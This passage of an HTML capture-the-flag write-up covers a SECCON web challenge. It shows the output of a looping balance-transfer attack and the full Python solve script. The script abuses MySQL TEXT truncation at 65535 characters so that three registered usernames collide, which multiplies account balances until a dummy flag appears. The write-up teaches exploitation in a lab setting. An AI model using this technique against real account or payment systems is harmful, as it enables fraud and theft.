+Account 1 - {'</span><span class="token function">id</span><span class="token string">': 2, '</span>balance<span class="token string">': 10, '</span>flag<span class="token string">': None}
+Account 2 - {'</span><span class="token function">id</span><span class="token string">': 3, '</span>balance<span class="token string">': 20, '</span>flag<span class="token string">': None}
+Account 2 --- 20 --> Accounts 0, 1, and 2
+Account 0 - {'</span><span class="token function">id</span><span class="token string">': 1, '</span>balance<span class="token string">': 40, '</span>flag<span class="token string">': None}
+Account 1 - {'</span><span class="token function">id</span><span class="token string">': 2, '</span>balance<span class="token string">': 30, '</span>flag<span class="token string">': None}
+Account 2 - {'</span><span class="token function">id</span><span class="token string">': 3, '</span>balance<span class="token string">': 20, '</span>flag<span class="token string">': None}
+==================================
+Account 1 --- 30 --> Accounts 0, 1, and 2
+Account 0 - {'</span><span class="token function">id</span><span class="token string">': 1, '</span>balance<span class="token string">': 70, '</span>flag<span class="token string">': None}
+Account 1 - {'</span><span class="token function">id</span><span class="token string">': 2, '</span>balance<span class="token string">': 30, '</span>flag<span class="token string">': None}
+Account 2 - {'</span><span class="token function">id</span><span class="token string">': 3, '</span>balance<span class="token string">': 50, '</span>flag<span class="token string">': None}
+Account 2 --- 50 --> Accounts 0, 1, and 2
+Account 0 - {'</span><span class="token function">id</span><span class="token string">': 1, '</span>balance<span class="token string">': 120, '</span>flag<span class="token string">': None}
+Account 1 - {'</span><span class="token function">id</span><span class="token string">': 2, '</span>balance<span class="token string">': 80, '</span>flag<span class="token string">': None}
+Account 2 - {'</span><span class="token function">id</span><span class="token string">': 3, '</span>balance<span class="token string">': 50, '</span>flag<span class="token string">': None}
+==================================
+...snip...
+==================================
+Account 1 --- 111054390860 --> Accounts 0, 1, and 2
+Account 0 - {'</span><span class="token function">id</span><span class="token string">': 1, '</span>balance<span class="token string">': 524579958980, '</span>flag<span class="token string">': None}
+Account 1 - {'</span><span class="token function">id</span><span class="token string">': 2, '</span>balance<span class="token string">': 111054390860, '</span>flag<span class="token string">': None}
+Account 2 - {'</span><span class="token function">id</span><span class="token string">': 3, '</span>balance<span class="token string">': 413525568130, '</span>flag<span class="token string">': None}
+Account 2 --- 413525568130 --> Accounts 0, 1, and 2
+Account 0 - {'</span><span class="token function">id</span><span class="token string">': 1, '</span>balance<span class="token string">': 938105527110, '</span>flag<span class="token string">': None}
+Account 1 - {'</span><span class="token function">id</span><span class="token string">': 2, '</span>balance<span class="token string">': 524579958990, '</span>flag<span class="token string">': None}
+Account 2 - {'</span><span class="token function">id</span><span class="token string">': 3, '</span>balance<span class="token string">': 413525568130, '</span>flag<span class="token string">': None}
+==================================
+Account 1 --- 524579958990 --> Accounts 0, 1, and 2
+Account 0 - {'</span><span class="token function">id</span><span class="token string">': 1, '</span>balance<span class="token string">': 1462685486100, '</span>flag<span class="token string">': '</span>SECCON<span class="token punctuation">{</span>dummy<span class="token punctuation">}</span>'<span class="token punctuation">}</span>
+GOT FLAG: SECCON<span class="token punctuation">{</span>dummy<span class="token punctuation">}</span></code></pre>
+<p>Nice! We got the flag! I've included the code of my entire script below for those who are interested.</p>
+<h1>Solve Script</h1>
+<pre class="language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> sys
+
+TARGET <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'/'</span>
+PROXIES <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://localhost:8080"</span><span class="token punctuation">,</span>
+    <span class="token string">"https"</span><span class="token punctuation">:</span><span class="token string">"http://localhost:8080"</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Account</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username
+        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">init_accounts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>requests<span class="token punctuation">.</span>Session<span class="token punctuation">]</span><span class="token punctuation">:</span>
+    username <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">65535</span>
+    accounts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        account <span class="token operator">=</span> Account<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+        account<span class="token punctuation">.</span>session<span class="token punctuation">.</span>proxies<span class="token punctuation">.</span>update<span class="token punctuation">(</span>PROXIES<span class="token punctuation">)</span>
+        account<span class="token punctuation">.</span>session<span class="token punctuation">.</span>verify <span class="token operator">=</span> <span class="token boolean">False</span>
+        register<span class="token punctuation">(</span>username<span class="token punctuation">,</span> account<span class="token punctuation">.</span>session<span class="token punctuation">)</span>
+        accounts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>account<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Registered an account with: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> a's"</span></span><span class="token punctuation">)</span>
+        username <span class="token operator">=</span> username <span class="token operator">+</span> <span class="token string">"a"</span>
+
+    <span class="token keyword">return</span> accounts
+
+<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>username<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> session<span class="token punctuation">:</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>TARGET <span class="token operator">+</span> <span class="token string">'api/register'</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span>username<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">assert</span> response<span class="token punctuation">[</span><span class="token string">"msg"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"Succeeded"</span>
+    <span class="token keyword">return</span>
+
+<span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span>amount<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> from_account<span class="token punctuation">:</span> Account<span class="token punctuation">,</span> to_account<span class="token punctuation">:</span> Account<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    response <span class="token operator">=</span> from_account<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>TARGET <span class="token operator">+</span> <span class="token string">'api/transfer'</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"recipientName"</span><span class="token punctuation">:</span>to_account<span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token string">"amount"</span><span class="token punctuation">:</span>amount<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">assert</span> response<span class="token punctuation">[</span><span class="token string">"msg"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"Succeeded"</span>
+    <span class="token keyword">return</span>
+
+<span class="token keyword">def</span> <span class="token function">user_info</span><span class="token punctuation">(</span>account<span class="token punctuation">:</span> Account<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">str</span> <span class="token operator">|</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    response <span class="token operator">=</span> account<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TARGET <span class="token operator">+</span> <span class="token string">'api/me'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
+        user_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span>response<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span>response<span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">:</span>response<span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        user_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span>response<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span>response<span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">:</span><span class="token boolean">None</span><span class="token punctuation">}</span>
+    <span class="token keyword">return</span> user_info
+
+<span class="token keyword">def</span> <span class="token function">print_account_info</span><span class="token punctuation">(</span>accounts<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Account<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> index<span class="token punctuation">,</span> account <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>accounts<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        account_info <span class="token operator">=</span> user_info<span class="token punctuation">(</span>account<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Account </span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string"> - </span><span class="token interpolation"><span class="token punctuation">{</span>account_info<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> account_info<span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"GOT FLAG: {account_info["</span></span>flag<span class="token string">"]}"</span><span class="token punctuation">)</span>
+            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    accounts <span class="token operator">=</span> init_accounts<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=================================="</span><span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            <span class="token triple-quoted-string string">"""
+            This loop continuously makes transfers from accounts 1 and 2 with the 'recipientName' set to the username of account 0.
+            However, because the MySQL TEXT type truncates strings to a length of 65535, every account has the same username (the username of account 0) in the database.
+            This means that a transfer to account 0 actually transfers money to all three of our accounts.
+            """</span>
+            account1_info <span class="token operator">=</span> user_info<span class="token punctuation">(</span>accounts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            transfer<span class="token punctuation">(</span>account1_info<span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> accounts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> accounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Account 1 --- {account1_info["</span></span>balance<span class="token string">"]} --> Accounts 0, 1, and 2"</span><span class="token punctuation">)</span>
+            print_account_info<span class="token punctuation">(</span>accounts<span class="token punctuation">)</span>
+                   
+            account2_info <span class="token operator">=</span> user_info<span class="token punctuation">(</span>accounts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            transfer<span class="token punctuation">(</span>account2_info<span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> accounts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> accounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Account 2 --- {account2_info["</span></span>balance<span class="token string">"]} --> Accounts 0, 1, and 2"</span><span class="token punctuation">)</span>
+            print_account_info<span class="token punctuation">(</span>accounts<span class="token punctuation">)</span>
+
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"An exchange failed with: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Trying again..."</span><span class="token punctuation">)</span>
+
+exploit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+		</div>
+	</div>
+  </body>
+
+
+	<style>
+		/**
+		 * Gruvbox dark theme
+		 *
+		 * Adapted from a theme based on:
+		 * Vim Gruvbox dark Theme (https://github.com/morhetz/gruvbox)
+		 *
+		 * @author Azat S. <to@azat.io>
+		 * @version 1.0
+		 */
+
+		code[class*="language-"],
+		pre[class*="language-"] {
+			color: #ebdbb2; /* fg1 / fg */
+			font-family: Consolas, Monaco, "Andale Mono", monospace;
+			direction: ltr;
+			text-align: left;
+			white-space: pre;
+			word-spacing: normal;
+			word-break: normal;
+			line-height: 1.5;
+
+			-moz-tab-size: 4;
+			-o-tab-size: 4;
+			tab-size: 4;
+
+			-webkit-hyphens: none;
+			-moz-hyphens: none;
+			-ms-hyphens: none;
+			hyphens: none;
+		}
+
+		pre[class*="language-"]::-moz-selection,
+		pre[class*="language-"] ::-moz-selection,
+		code[class*="language-"]::-moz-selection,
+		code[class*="language-"] ::-moz-selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		pre[class*="language-"]::selection,
+		pre[class*="language-"] ::selection,
+		code[class*="language-"]::selection,
+		code[class*="language-"] ::selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		/* Code blocks */
+		pre[class*="language-"] {
+			padding: 1em;
+			margin: 0.5em 0;
+			overflow: auto;
+		}
+
+		:not(pre) > code[class*="language-"],
+		pre[class*="language-"] {
+			background: #191B1C; /* bg0_h */
+			border: 1px solid #665C54;
+		}
+
+		/* Inline code */
+		:not(pre) > code[class*="language-"] {
+			padding: 0.1em;
+			border-radius: 0.3em;
+		}
+
+		.token.comment,
+		.token.prolog,
+		.token.cdata {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.delimiter,
+		.token.boolean,
+		.token.keyword,
+		.token.selector,
+		.token.important,
+		.token.atrule {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.operator,
+		.token.punctuation,
+		.token.attr-name {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.tag,
+		.token.tag .punctuation,
+		.token.doctype,
+		.token.builtin {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.entity,
+		.token.number,
+		.token.symbol {
+			color: #d3869b; /* purple2 */
+		}
+
+		.token.property,
+		.token.constant,
+		.token.variable {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.string,
+		.token.char {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.attr-value,
+		.token.attr-value .punctuation {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.url {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.function {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.regex {
+			background: oklch(0.8591 0 126.59 / 15.94%); /* green2 */
+		}
+
+		.token.bold {
+			font-weight: bold;
+		}
+
+		.token.italic {
+			font-style: italic;
+		}
+
+		.token.inserted {
+			background: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.deleted {
+			background: #fb4934; /* red2 */
+		}
+	</style>
+</html>
